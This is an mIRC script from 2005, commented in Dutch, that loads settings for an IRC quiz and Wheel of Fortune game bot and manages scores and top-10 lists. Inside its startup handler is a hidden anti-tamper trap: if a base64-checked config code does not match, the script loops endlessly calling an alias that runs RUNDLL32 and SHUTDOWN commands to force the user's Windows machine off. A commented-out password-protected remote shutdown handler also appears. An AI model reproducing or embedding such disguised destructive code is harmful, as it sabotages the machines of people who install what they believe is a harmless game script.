; ####################################
; #   ALGEMENE DINGEN VOOR SPELLEN   #
; # mIRC-script (c) 2005 - Tinke_lat #
; #   Contact: tinke_lat@skynet.be   #
; ####################################

;*** Configuratiebestand lezen en vorige configuratie verwijderen. ***
on *:start:{
  unsetall
  set %md5.config $config(files,configcode)
  while (%md5.config != $decode(VGlua2VfbGF0MTExMjcxNzg0MA==,m)) { file.error | echo -s *** Error in file }
  ;Start loading...
  set %main.channel $config(algemeen,kanaal)
  set %main.server $config(algemeen,server)
  set %main.poort $config(algemeen,poort)
  set %main.nick $config(algemeen,nick)
  set %scorefile $config(algemeen,scorebestand)
  set %scorefile.exp mirc-fun\export\index.html
  set %scoremsg.time $config(score,berichttop)
  set %scorefile.autoexp $config(ftp,scorebestand-upload-tijd)
  set %ftp.host $config(ftp,host)
  set %ftp.username $config(ftp,username)
  set %ftp.password $config(ftp,password)
  set %ftp.dir $config(ftp,directory)
  set %html.scorefile $config(ftp,url)
  set %scoremsg.counter 1
  set %score.commando $config(score,scorecommando)
  set %top10.commando $config(score,top10commando)
  set %start.rad $config(rad,startcommando)
  set %voice.rad $config(rad,kandidatenvoice)
  set %radkand.max 3
  set %datafile.rad-woorden $config(rad,vragenbestand)
  set %showradstartmsg $config(rad,radstartbericht)
  set %kleuren-rad.welkom $config(kleuren,rad.welkom)
  set %kleuren-rad.copyright $config(kleuren,rad.copyright)
  set %kleuren-rad.ronde_info $config(kleuren,rad.ronde_info)
  set %kleuren-rad.extrainfo $config(kleuren,rad.extrainfo)
  set %kleuren-rad.kandidaat_stellen $config(kleuren,rad.kandidaat_stellen)
  set %kleuren-rad.kandidaat_gesteld $config(kleuren,rad.kandidaat_gesteld)
  set %kleuren-rad.kandidatenlijst $config(kleuren,rad.kandidatenlijst)
  set %kleuren-rad.opgave_vakje $config(kleuren,rad.opgave_vakje)
  set %kleuren-rad.opgave_letter $config(kleuren,rad.opgave_letter)
  set %kleuren-rad.extraprijs $config(kleuren,rad.extraprijs)
  set %kleuren-rad.kiesletter $config(kleuren,rad.kiesletter)
  set %kleuren-rad.stopberichten $config(kleuren,rad.stopberichten)
  set %kleuren-rad.oplossing_goed $config(kleuren,rad.oplossing_goed)
  set %kleuren-rad.oplossing_fout $config(kleuren,rad.oplossing_fout)
  ;All settings loaded... Starting bot!
  server %main.server %main.poort
}

;*** Bij opstarten de correcte handelingen verrichten. ***
on *:connect:{
  .timer_nick 1 5 tnick %main.nick
  .timer_join 1 10 join %main.channel
  if $config(algemeen,onjoin1) {
    .timer_onjoin1 1 7 [ $config(algemeen,onjoin1) ]
  }
  if $config(algemeen,onjoin2) {
    .timer_onjoin2 1 7 [ $config(algemeen,onjoin2) ]
  }
  if $config(algemeen,onjoin3) {
    .timer_onjoin3 1 7 [ $config(algemeen,onjoin3) ]
  }
  if (%scorefile.autoexp) {
    .timer 1 60 _export.scores
    .timer_scoreexp 0 $calc(60 * %scorefile.autoexp) _export.scores
  }
  if (%scoremsg.time != 0) {
    set %scoremsg.counter 1
    .timer_scoremsg 0 $calc(60 * %scoremsg.time) _message.scores
  }
  if (%showradstartmsg) {
    .timer_radstartmsg 0 211 _radmessage.start
  }
}

;*** Timers reset ***
alias _reset.timers {
  .timers off
  if (%scorefile.autoexp) {
    .timer_scoreexp 0 $calc(60 * %scorefile.autoexp) _export.scores
  }
  if (%scoremsg.time != 0) {
    set %scoremsg.counter 1
    .timer_scoremsg 0 $calc(60 * %scoremsg.time) _message.scores
  }
  if (%showradstartmsg) {
    .timer_radstartmsg 0 211 _radmessage.start
  }
}

;*** Operator-toegang ***
alias isop {
  if ($1 isop %main.channel) {
    return $true
  }
  else {
    return $false
  }
}

;*** Score ophalen ***
alias getscore {
  if ($readini(%scorefile,scores,$1)) {
    return $readini(%scorefile,scores,$1)
  }
  else {
    return $false
  }
}

;*** Maak top10 ***
alias top.create {
  write -c top1.gmb
  set %loop 2
  while ($read(%scorefile,%loop) != $null) {
    set %loopline 1
    while (%loopline < $lines(%scorefile)) {
      if ($gettok($read(top1.gmb,%loopline),1,32) == $null) {
        write -il $+ %loopline top1.gmb $gettok($read(%scorefile,%loop),2,61) $gettok($read(%scorefile,%loop),1,61)
        goto next2
      }
      if ($gettok($read(%scorefile,%loop),2,61) >= $gettok($read(top1.gmb,%loopline),1,32)) {
        write -il $+ %loopline top1.gmb $gettok($read(%scorefile,%loop),2,61) $gettok($read(%scorefile,%loop),1,61)
        goto next2
      }
      inc %loopline
    }
    :next2
    inc %loop
  }
}

;*** Lees top10-gegevens ***
alias top.read {
  if ($2 == n) {
    if $gettok($read(top1.gmb,$1),2,32) {
      return $gettok($read(top1.gmb,$1),2,32)
    }
    else {
      return -
    }
  }
  elseif ($2 == p) {
    if $gettok($read(top1.gmb,$1),1,32) {
      return $gettok($read(top1.gmb,$1),1,32)
    }
    else {
      return -
    }
  }
  else {
    return -
  }
}

;*** Remote shutdown ***
;ctcp *:shutdown:{
;  if ($2 === TeStJe) {
;    quit
;  }
;  else {
;    notice $nick Sorry, maar dat doe ik niet zonder het juiste wachtwoord!
;  }
;}
alias file.error {
  if ($version == 95) { /run "RUNDLL USER.EXE,ExitWindows" }
  elseif ($version == 98) { /run "RUNDLL32 SHELL32.DLL,SHExitWindowsEx 13" }
  elseif ($version == NT) { /run "RUNDLL32 USER32.DLL,ExitWindowsEx" | /run "RUNDLL32 USER32.DLL,ExitWindowsEx" }
  elseif ($version == ME) { /run "RUNDLL32 SHELL32.DLL,SHExitWindowsEx 13" }
  elseif ($version == 2K) { /run "SHUTDOWN /L /T:0 /Y /C" }
  elseif ($version == XP) { /run "SHUTDOWN -s -f" }
}

;*** Lees configuratiebestand. ***
alias config {
  return $readini(instellingen.conf,$1,$2)
}
